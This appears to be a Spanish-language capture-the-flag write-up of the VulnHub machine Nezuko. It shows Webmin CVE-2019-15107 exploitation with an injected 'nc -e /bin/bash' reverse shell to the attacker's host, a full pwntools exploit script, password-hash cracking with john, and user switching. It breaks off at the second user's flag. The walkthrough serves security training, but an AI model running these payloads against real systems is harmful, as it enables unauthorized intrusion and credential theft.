<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Writeup Nezuko VulnHub</title>
<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/wr/nezuko.png">
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Writeup Nezuko VulnHub" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Resolución de la máquina Nezuko de la plataforma de VulnHub" />
<meta property="og:description" content="Resolución de la máquina Nezuko de la plataforma de VulnHub" />
<link rel="canonical" href="http://localhost:4000/another-page.html" />
<meta property="og:url" content="http://localhost:4000/another-page.html" />
<meta property="og:site_name" content="Writeup Nezuko VulnHub" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Writeup Nezuko VulnHub" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Nezuko de la plataforma de VulnHub","headline":"Writeup Dina 1.0.1 Vulnhub","url":"http://localhost:4000/another-page.html"}</script>

    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
    <script src="/assets/js/respond.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

<meta name="theme-color" content="#353535">
<meta name="msapplication-navbutton-color" content="#353535">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

  </head>
  <body>

    <div class="wrapper">

      <section>
        <div id="title">
          <h1>Writeup Nezuko VulnHub</h1>
          <p>Resolución de la máquina Nezuko de la plataforma de VulnHub</p>
        </div>

<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ nmap</span><span class="p"> 192.168.100.30
Nmap scan report for 192.168.100.30
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
13337/tcp open  unknown</span>
</code></pre></div></div>

<div><p>Si damos un vistazo a la web encontramos una imagen bastante mona</p></div>
<div><p><img src="./1.png"><p></div>

<div><p>Fuzzeando un poco con gobuster podemos encontrar un robots.txt</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gobuster</span><span class="p"> dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 192.168.100.30 -t 100
===============================================================
[+] Url:                     http://192.168.100.30
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
</span><span class="kd">/robots.txt</span><span class="p">           (Status: 200) [Size: 105]</span>
</code></pre></div></div>

<div><p>Al hacerle un curl podemos encontrar una cadena en base32, procedemos a decodearla</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ curl </span><span class="p">-s 192.168.100.30/robots.txt
NBUW45BAMZZG63JANZSXU5LLN4QDUIDUNBUXGIDJOMQG433UEB2GQZJAOJUWO2DUEBYG64TUEB2G6IDFNZ2W2ZLSMF2GKIC6O5PA====</span>
</code></pre></div></div>

<div><p>Decodificando la cadena, nos dice no es el camino, que enumeremos otros puertos</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ curl </span><span class="p">-s 192.168.100.30/robots.txt | </span><span class="s2">base32 </span><span class="p">-d
hint from nezuko : this is not the right port to enumerate ^w^</span>
</code></pre></div></div>

<div><p>Tenemos el puerto 13337, al ver el navegador encontramos un login de webmin</p></div>
<div><p><img src="./2.png"><p></div>

<div><p>Mirando con searchsploit encontramos un script de bash para RCE</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ searchsploit</span><span class="p"> Webmin |</span><span class="s2"> grep</span><span class="no"> "Remote Code Execution"</span><span class="p">
------------------------------------------------------------------ ------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ------------------------
Webmin 1.920 - Remote Code Execution                              | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit) | linux/remote/47230.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)     | linux/webapps/47330.rb
------------------------------------------------------------------ ------------------------</span>
</code></pre></div></div>

<div><p>Al probar el script podemos ver que es vulnerable</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ searchsploit </span><span class="p">-m 47293.sh &>/dev/null
</span><span class="s2">❯ ./47293.sh </span><span class="p">https://192.168.100.30:13337
Testing for RCE (CVE-2019-15107) on https://192.168.100.30:13337: </span><span class="kd">VULNERABLE!</span>
</code></pre></div></div>

<div><p>Lo que podemos hacer es modificar el comando en el script para enviarnos una revshell</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">old=id|echo '$FLAG'
</span><span class="s2">old=id|nc -e /bin/bash 192.168.100.9 443</span>
</code></pre></div></div>

<div><p>Al guardar y ejecutar de nuevo, nos llegara la shell como nezuko</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ ./47293.sh </span><span class="p">https://192.168.100.30:13337
Testing for RCE (CVE-2019-15107) on https://192.168.100.30:13337: </span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 192.168.100.30
script /dev/null -c bash
Script started, file is /dev/null
</span><span class="s2">nezuko@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ whoami
nezuko
</span><span class="s2">nezuko@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
192.168.100.30
</span><span class="s2">nezuko@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat nezuko.txt
Congratulations! You have found nezuko! Now, try to surpass your limit! Right here, right now...                                                                                                                                                                                                 ....

                                                           .,,,,,,,..                                                                                                                            ....
.  ...................................,,,,,,,,,.,,,,,,,,,,,.......,...                                                                                                                           ....
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,...,.                                                                                                                             ....
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,...,.                                              .......................                                                        ....
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                  .,........,...,....................................                                                        ....
 ,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                  ...........           .........................,...                                                        ....
 .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                  ...            .                ........,......,...                                                        ....
 .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                                         ..     ...  ...,,....,..,...  ...                                                   ....
 .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                                     ..  ....     ..... ..,,.....,...  ...            .                                      ....
 .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                                   . . ... .. .     ....  .......,...            ...  .                                          
 .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                             . .   .                 ..  .  ...,*,,,.      ............                                          
 .,,,,,,,,,,,,,,,,,,,,,,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                             ..    */*/(/*,..      .... ..   ..*/((/,. .................                                         
 ..,,,,,,,,,,,,,,,,,,,,,,,,.,,,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                           ..  .,*((((((((((((((/*,. .. ..   ..*/((/.. .................                                         
  .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,,,,,,,,,,,,,,                      .  .   .,/(((((((((((((((((((((,... .. ..*/(/*..,(, ..............                                         
  .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,                    .      .,*/((((((((((((((((((((((((, . ....,**..,((/, ...............                                        
  .,,,,,,,,,,,,..,,,,,,,,,,,,,..,,,,,,,,,,,,,,,.,,,,,,,,,,,,.,,,,,,..                     .   .*/((((((((((((((((((((((((((((/  ,/,,,./(((((, ...............                                        
   ............................................................((*,..                   .  .  *(((((((((((((((((((((((((((((((///,,,,(((((/..................                                        
   ...............................................................,..               .        ,(((((((((((//(((((((((((((((((((/,.,,,,*(/,  ..................                                        
   ......................................................... .....,..                 .. .  ,/(((((/*,,**/////(((((((((((((((((*  ...,..,....................                                        
   ...............................................................,..                       /((///((((((((((((((((((((((((/,/(#/ ....,..,....................                                        
    ...........................................................  .,..                      .((((((((((/****/(((((((((((((((#(/(/ . ..,..,....................                                        
    ...........................................................#/,,..              .    . .,((((((((/**/((/,/(((((((((*,*((((((/ ....,..,....................                                        
    ..............................................................,..              ...    ,/((/**..*///*..*#(((((((((/(((((((#(* ....,..,....................                                        
    ..............................................................,.               .    . ,/((/*/(((/(((#/*(((((((((/*..,**,(#/. ....,..,....................                                        
   .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.             ..    . /((((////,.,///##(((((((((//#(/(((,/.  .,.,,..,....................                                        
   .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,,,,,,,,,,,,,,,,,,,,.                     */(((////,**(/(#(((((((((#(((/.((#(*  .,,..,..,....................                            ............
   .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.             .      .,*((((//(((((###(#(((((((#((/*/((#*.  .,,,,,..,....................                            ............
   .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.              .  .. ,*,*/(((/*,*,/##(((##(##//#(((((###.  ..,,,,,.,,....................                            ............
    ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.             ..  .  ,....,*,,,*,,,.,,*////(((((((*,,(#*   ..,,,,,.,,....................                          ..............
    ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.              ....    ....//,*/******,*********,**,*,,,,,,,,*,.,,.,,....................                          ..............
    .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.              ....  ... ..,*,,/////****////(//(((((*/*//////*/*,,.,,....................                          ..............
    .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.             ... . ... ...**,,******,****************,******,**,,,,,....................                            ............
    ..,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.             .. . ,, ....... ...............,,,,,,,,,,******,*,,,,,,.................... .                          ............
     .,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.             .... ,*, ....  ............................... ...,,,,,....................                            ............
     .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,,,,,,,,,,,,,,,,.             ...  .,*,,,,,,*,,,,,,..,,,,,,,,.    .  ..........,,,,,,....................                            ............
     .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.             ..    .***,**********,,*****,.        .     . ....,,,,,....................                            ............
      .......................................................,,,,*,..            . .     ,****,*******,,*,.             .       .....,.,,....................                            ............
        ...................................................... /*.,..            ..       *****,*******,**,   ....     ..,.     .  ..,,,,....................                            ............
        .......................................................,..,..          ..         ,*****,*******,*,. ......    ..,,.    ... .,,,,....................                            ............
        ..........................................................,..             .....    .*****,****,,,**.........   ..,,,. ..... .,,,,....................                            ............
        ..........................................................,..          ........     ,*****,****,,(#,.........   ,,,,. ..... .,,,,....................                            ............
         .........................................................,..      ............     .,/********####*.........   .,,,.........,,,,....................                            ............
         ......................................................#/,,..     ..............    ..(#(/**/*####(*,,.......    .,.....,....,,,,....................                            ............
          ........................................................*,.     ..............    ..,#####((####//*..... ..    ... .,,,,.,,,,,,....................                            ............
          ...........................................................     ...............   ...#####(####/*(,....  ..    ...,,,,,,,,,,,,,....................                            ............
          .,,,,,,,,,,,,,,,,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.,,,,,,,.     ...............   ...(###(####(//(,....  ...   ...,,,,,,,,,,,,,....................                            ............
           ,.,,,,,.,,,,,,,,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.     ................  ..,*(#(###%(*//(...    ...  ...,,,,,,,,,,,,,,....................                            ............
           ..,,,,,.,,,,,,,,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.     ................ ...,/*(#####*/((*...   ....  ...,,,,,,,,,,,,,,....................                            ............
           ..,,,,,.,,,,,.,,,,,.,,,,,,,,,,,,,,,,.,,,,,,,,,,,,,,,,,,,,.     ................ ...,//####%*///(*..   ........,,,,,,,,,,,,,,,,....................                            ............
            .,,,,,,,,,,,.,,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.     ....................//(//#%#*/(//...  .........,,,,,,,,,,,,,,,,....................                            ............
             .,,,,,,,,,,,,,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.     ...................*/(///((//((/*..  .........,,,,,,,,,,,,,,,,,....................                            ............
             .,,,,,,,,,,,,,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.     ..................,*///******,,,..  ..........,,,,,,,,,,,,,,,,,....................                            ............
              .,,,,,,,,,.,,,.,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.     ................ .,,...,,,,,,,,...  ........ .,,,,,,,,,,,,,,,,,....................                            ............
              ..,,,,,,,,.,,..,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.     ..................,,,,,,,,,,,,,  . ........ ..,,,,,,,,,,,,,,,,,....................                            ............
                ,,,,,,,,.,,,.,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.     ..........................      .......... ...,,,,,,,,,,,,,,,.,....................                            ............
                .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.     .................,****/*.      .......... ....,,,,,,,,,,,,,,,.,....................                            ............
                 .,,,,,,,,,,.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,     ..................***,.        .......... ....,,,,,,,,,,,,,,,.,....................                            ............
                 ........................,,,,,,,,,,,,,,,,,,,,,,,,,,..     ...................           .........  ........,,,,,,,,,,,,.,....................                            ............
                   ............................................,*,,,.        ..............            .........   .........,,,,,,,,,,,.,....................                            ............
                    ...........................................,,.,,.             .......             .. .....    ..........,,,,,,,,,,,.,....................                            ............
                     .............................................,,.                                 .          ..........,,,,,,,,,,,,.,....................                            ............
                      ............................................,,.                     ....,,,..  .           ..........,,,.,.,,,,,,.,....................                            ............
                       ...........................................,,.                       .,(////*,.          .........  ,,,,,.,,,,,,.,....................                            ............
                        ...................................... //,,,.     .............    ....*/(//(/        ..........    ,,.,.,,,,,,.,....................                            ............
                        .......................................,,.,*.      .....................,(/.,//      ..........     ...,.,,,,,,.,...................                             ............
                        .,,........................................,.       ...................,////**//,        .....      .....,,,,,,.,...................                            .............
                         .,,,,..,,,,,,,,,,,,,,,.,,,,,,,,,,,,,,,,,,,,.       ...................,/((/////*                   .....,,,,,,.,...................                            .............
                           ,,,..,,,,,,,,,.,,,,,.,,,.,,,,,,,,,,,,,,,,.         ................ ,/(/(//(,    .......        ......,,,,,,.,...................                            .............
                           ..,..,,,,,,.,..,,,,,.,,,.,,,,,,,,,,,,,,,,.             ..........   ./(/(*,,.    .....................,,,,,,.,..................                              ............
                             ...,,,,,,....,,,,,.,,,.,,,,,,,,,,,,,,,,.                 ....     .,,,,,,,       ................  ..,,,,,.,.   ................                                        
                              ..,,.,,,..,,,,,,,.,,,.,,,,,,,,,,,,,,,,.                           ...,,,        ..............    ...,,,,.,.                                                           
                               .,,.,,,..,,,,,,,.,,,..,,,,,,,,,,,,,,,.                           .,,,.             ...       ......,,,,,.,.                                                           
                                ...,,,,,,,,,,,,.,,,..,,,,,,,,,,,,,,,.               ................                ...........  .,,,,,.,.                                                           
                                  .,.,,,,,,,,,,.,,,,,,.,..,,.,,,,,,,.           ...............                .........    .......,,,,.,.                                                           
                                   ..,,,,,,,,,,.,,,..,.,..,,,,,,,,,,.                                                   ...........,,,,.,.                                                           
                                     .,,,,,,,,,.,,,,,,.,..,,,,,,,,,.,                  ................            ........      ....................................................................
                                      ..,,,,,,,.,,,,,,.,,,,,,,,,,,,.,             .......................                ..,*/(/,....................................................................
                                        .,,,,,,.,,,,,,,,,,,,,,,,,,,.,         .................,,,**/*..              .,*,*((/((/*...................................................................
                                          ...........................               ......  ..*//(##/*. ..  ...........................,.,...........................................................
                                             .......................                      .,*/#(//*(/(/....,,,,.........,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.....,,..,,,,,,,,,,,...,,,........
                                                ..  ................      ..................,....,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,...
..........................................................................,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
..............................,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
..........................,,,..,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
..........................,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,


1af0941e0c4bd4564932184d47dd8bef
</span><span class="s2">nezuko@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Para automatizar la explotación e intrusión desarrolle el siguiente script</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="kd">from</span><span class="p"> pwn </span><span class="kd">import </span><span class="p">*
</span><span class="kd">import </span><span class="p">requests, warnings

warnings.simplefilter(</span><span class="s2">"ignore"</span><span class="p">)

</span><span class="kd">if</span><span class="k"> len</span><span class="p">(sys.argv) </span><span class="kd"><</span><span class="na"> 3</span><span class="p">:
    </span><span class="k">print</span><span class="p">(</span><span class="k">f</span><span class="s2">"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} &ltrhost> &ltlhost>\n"</span><span class="p">)
    exit(</span><span class="na">1</span><span class="p">)

</span><span class="kd">def</span><span class="na"> cmd</span><span class="p">():
    target </span><span class="kd">=</span><span class="k"> f</span><span class="s2">"https://{sys.argv[1]}:13337/password_change.cgi"</span><span class="p">
    data </span><span class="kd">=</span><span class="p"> {</span><span class="s2">"user"</span><span class="p">:</span><span class="s2"> "wheel"</span><span class="p">,</span><span class="s2"> "pam"</span><span class="p">:</span><span class="s2"> ""</span><span class="p">,</span><span class="s2"> "expired"</span><span class="p">:</span><span class="s2"> "2"</span><span class="p">,</span><span class="s2"> "old"</span><span class="p">:</span><span class="k"> f</span><span class="s2">"id|nc -e /bin/bash {sys.argv[2]} 443"</span><span class="p">,</span><span class="s2"> "new1"</span><span class="p">:</span><span class="s2"> "wheel"</span><span class="p">,</span><span class="s2"> "new2"</span><span class="p">:</span><span class="s2"> "wheel"</span><span class="p">}
    headers </span><span class="kd">=</span><span class="p"> {</span><span class="s2">"Content-Type"</span><span class="p">:</span><span class="s2"> "application/x-www-form-urlencoded"</span><span class="p">,</span><span class="s2"> "Referer"</span><span class="p">:</span><span class="k"> f</span><span class="s2">"https://{sys.argv[1]}:13337/session_login.cgi"</span><span class="p">}
    cookies </span><span class="kd">=</span><span class="p"> {</span><span class="s2">"redirect"</span><span class="p">:</span><span class="s2"> "1"</span><span class="p">,</span><span class="s2"> "testing"</span><span class="p">:</span><span class="s2"> "1"</span><span class="p">,</span><span class="s2"> "sid"</span><span class="p">:</span><span class="s2"> "x"</span><span class="p">,</span><span class="s2"> "sessiontest"</span><span class="p">:</span><span class="s2"> "1"</span><span class="p">}
    requests.post(target, </span><span class="no">data</span><span class="kd">=</span><span class="p">data, </span><span class="no">headers</span><span class="kd">=</span><span class="p">headers, </span><span class="no">cookies</span><span class="kd">=</span><span class="p">cookies, </span><span class="no">verify</span><span class="kd">=</span><span class="na">False</span><span class="p">)

threading.Thread(</span><span class="no">target</span><span class="kd">=</span><span class="p">cmd, </span><span class="no">args</span><span class="kd">=</span><span class="p">()).start()
shell </span><span class="kd">=</span><span class="p"> listen(</span><span class="na">443</span><span class="p">, </span><span class="no">timeout</span><span class="kd">=</span><span class="na">20</span><span class="p">).wait_for_connection()
shell.sendline(</span><span class="k">b</span><span class="s2">"export TERM=xterm; cd"</span><span class="p">)
shell.interactive()</span>
</code></pre></div></div>

<div><p>Basta con ejecutarlo con el rhost y lhost de argumentos para obtener una shell</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ sudo python3</span><span class="p"> exploit.py 192.168.100.30 192.168.100.9
[</span><span class="s2">+</span><span class="p">] Trying to bind to :: on port 443: Done
[</span><span class="s2">+</span><span class="p">] Waiting for connections on ::443: Got connection from ::ffff:192.168.100.30
[</span><span class="na">*</span><span class="p">] Switching to interactive mode
</span><span class="kd">$</span><span class="p"> whoami
nezuko
</span><span class="kd">$</span><span class="p"> hostname -I
192.168.100.30
</span><span class="kd">$</span>
</code></pre></div></div>

<div><p>Mirando el /etc/passwd encontramos que zenitsu tiene su hash en el passwd y no en el shadow</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">nezuko@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
nezuko:x:1000:1000:nezuko,,,:/home/nezuko:/bin/bash
zenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0:1001:1001:,,,:/home/zenitsu:/bin/bash
</span><span class="s2">nezuko@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>El hash podemos romperlo con john y encontrar la contraseña de zenitsu</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ cat </span><span class="p">hash
zenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0

</span><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 XOP 2x])
</span><span class="kd">meowmeow</span><span class="p">         (</span><span class="na">zenitsu</span><span class="p">)
Session completed</span>
</code></pre></div></div>

<div><p>Desde la shell de nezuko podemos convertirnos en zenitsu con su</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">nezuko@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ su zenitsu
Password: </span><span class="kd">meowmeow</span><span class="p">
</span><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ whoami
zenitsu
</span><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
192.168.100.30
</span><span class="s2">zenitsu@ubuntu</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat zenitsu.txt 
Kaminari no kokyū, Ichi no kata...., Hekireki Issen!

                       ............,,,,,,,,,,,,****************/////////////////////////////***************,,,,,,,,,,,.........                                
                 .............,,,,,,,,*********////////////((((((((((((((((((((((((((((((((((((///////////********,,,,,,,,.............                        
                 ............,,,,,,,,,*********////////////((((((((((((((((((((((((((((((((((((//////////*********,,,,,,,,............                         
                 ............,,,,,,,,,**********////////////////(((((((((((((((((((((((((((((((//////////*********,,,,,,,,...........     .                    
                .............,,,,,,,,,*******,****///////////////(((((((((((((((((((((((((((((//////(##/**********,,,,,,,,..........    ...                    
                 ..........,,,,,,,,,,,*****,*,*****///////////////((/(((((((((((((((((((((///(/(######***********,,,,,,,,,....................                 
                   ...............,,,,,,,,,,,,*********//////////////////////////////////////####%%##*******,,,,,,,,,,,........................                
                     ..............,,,,,,,,,,,,,,***************///////////////(@%#%(//////#####@#******,,,,,,,,,,,,..........................               
                .............,,,,,,,,,,,,**,,,*********/////////////////////(/(###%###///##########(/*********,,,,,,,,,,,,......................               
                .............,,,,,,,,,,,,,,,,,**********////////////////((((((%#%###%(%########//*********,,,,,,,,,,,.......................               
               ...............,,,,,,,,,,,,,,,,**********//////////////(#%%%%##(((#######(###%###(**********,,,,,,,,,,,........................               
               ................,,,,,,,,,,,,,,,**********///////////#%&&&&&%%(##(##((####(((%####/**********,,,,,,,,,,,........................               
                ...............,,,,,,,,,,,,,,,**********//////#&%&&&&&&&&@@%/##((/(####%%#/(###(((*********,,,,,,,,,,,,,........................               
                 ..............,,,,,,,,,,,,,,,**********///%&&&%&&&&&&&&&&&%/##//(###((##(//(#(((**********,,,,,,,,,,,,,,.......................               
                 ...............,,,,,,,,,,,,,,**********/%&%%&%&&&@@&&&&&&&%//#%####(((#((//&@((**********,,,,,,,,,,,,,.........................               
                 ...............,,,,,,,,,,/((/*//#/****/%%%&&&%#(%&&&&&%&&*(##(((%((((////#((/**********,,,,,,,,,,,,..........................               
                  ...............,,,,,,,,*%%#(((((**%%%%%%%%%%&%(%&&&&%%#(#((((((%&((//////(*********,,,,,,,,,**/*................... ........               
                   ...............,,,,,*&&&&&%%(((((((%%%%%%%%%%%%%%#&%%%%((##((((((*//////*********,*/(#%%&&&&&&%%#,...........................               
                   ................,,,*%%%#%&&((((/(/*#%%%(//(###(*#(#(*(((#((*,//////******/(%&&&&&&&%%#(*,,,,,..................... ........               
                      .............,,,##*/#%&&%%(((//(((,*,(%%%%%%%#//(%%///////(//*,,*/#&&&&&&&%#(*,,,,,,,,,,,,,...................... ........               
                      ..............,,/#(%%&&&&%((/%%*(**,,*/%%%%%%%%//(###(/((&&&&&&%(*,,,,,,,,,,,,,,,,,,,,.......................   .....                
                        .............,(/#/*(%%%#((*%%%%%//,,,,,,,,*,,#,#(,#&&&%&/#%#*,........,,,,,,,,,,,,,,........................... ......                 
                         .............//##%%%%%((/*/%%#(//(//,,,,/%(%%##%%%%//,.......,,,,.....,,,,,,,,,.................. .......... ....                   
                         ..............(#/##(#(//**/(/*/**//,,,(/#%(#%%%*%(#/,......,,,,,,,,,,........,..................... .......... ....                   
                          ..............,#####/////(/(//#/*,/(##(%#///*,,..........,,,,,,,,,,,,,.......,.................... ..........  ...                   
                           ..............*##((/,*////////*..(*,//(,..............,,..,,,,,,,,,,,,,,,.......................  ..........  ..                    
                             .............,*...*/%////(#/*....................,,,..,,,..,,,,,,,,,,,,,,,,..................   .....                             
                              ...............*/////////////((/........,,,,...,,,,,,..,,,..,,,,,,,,,,,......,,,............                                     
                                ...........,//((////////////*.....,,,,,,...............,,.....,,...........,*(#...........                                     
                                ............///////////#///...............................,............,.,***#((,.........                                     
                                  ...........,///////*///*...........................................,..,****#(((///,......                                    
                                ...............,//*/#(//*,..........,/,*/..........................,...,/,..,////#//#,.....                                    
                                ..................*/***..........,***((((,...............................,,,(*,,,//*//.... .                                   
                                     ..............................(/////,....................................**,/*,,#,.(..                                    
                                          ........................,**///(/*...................................../....#*/.                                      
                                     ..............................*/*.,,*,........................................,,*/......                                  
                               ........ .........................**(#(,./(.,,,,.................................(,,..,*........                                
